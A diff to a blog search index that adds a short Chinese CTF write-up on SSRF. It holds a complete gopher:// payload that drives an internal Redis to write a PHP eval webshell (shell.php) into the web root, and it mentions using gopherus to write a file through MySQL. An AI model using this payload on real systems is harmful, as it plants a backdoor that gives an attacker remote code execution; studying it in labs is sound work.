@@ -4,6 +4,25 @@
   
     
     <entry>
+      <title>CTFSHOW-SSRF</title>
+      <link href="/2025/05/20/ssrf/"/>
+      <url>/2025/05/20/ssrf/</url>
+      
+        <content type="html"><![CDATA[<h2 id="gopher协议打无密码sql"><a href="#gopher协议打无密码sql" class="headerlink" title="gopher协议打无密码sql"></a>gopher协议打无密码sql</h2><p><img src="/../images/image-20250520133934502.png" alt="image-20250520133934502"></p><p>先使用gopherus生成payload 利用mysql写文件写一个2.php进去</p><p>访问 <code>靶机/2.php</code></p><p>post传参就可以了</p><h2 id="打redits"><a href="#打redits" class="headerlink" title="打redits"></a>打redits</h2><p><img src="/../images/image-20250520135459830.png" alt="image-20250520135459830"></p><p>传参url&#x3D;gopher:&#x2F;&#x2F;127.0.0.1:6379&#x2F;_%252A1%250D%250A%25248%250D%250Aflushall%250D%250A%252A3%250D%250A%25243%250D%250Aset%250D%250A%25241%250D%250A1%250D%250A%252431%250D%250A%250A%250A%253C%253Fphp%2520%2540eval%2528%2524_POST%255B%2527a%2527%255D%2529%253B%253F%253E%250A%250A%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%25243%250D%250Adir%250D%250A%252413%250D%250A%2fvar%2fwww%2fhtml%250D%250A%252A4%250D%250A%25246%250D%250Aconfig%250D%250A%25243%250D%250Aset%250D%250A%252410%250D%250Adbfilename%250D%250A%25249%250D%250Ashell.php%250D%250A%252A1%250D%250A%25244%250D%250Asave%250D%250A%250A</p><p>然后访问shell.php 传参就可以了</p>]]></content>
+      
+      
+      
+        <tags>
+            
+            <tag> ssrf </tag>
+            
+        </tags>
+      
+    </entry>
+    
+    
+    
+    <entry>
       <title>apache 文件上传 (CVE-2017-15715)漏洞复现</title>
       <link href="/2023/12/24/1/"/>
       <url>/2023/12/24/1/</url>
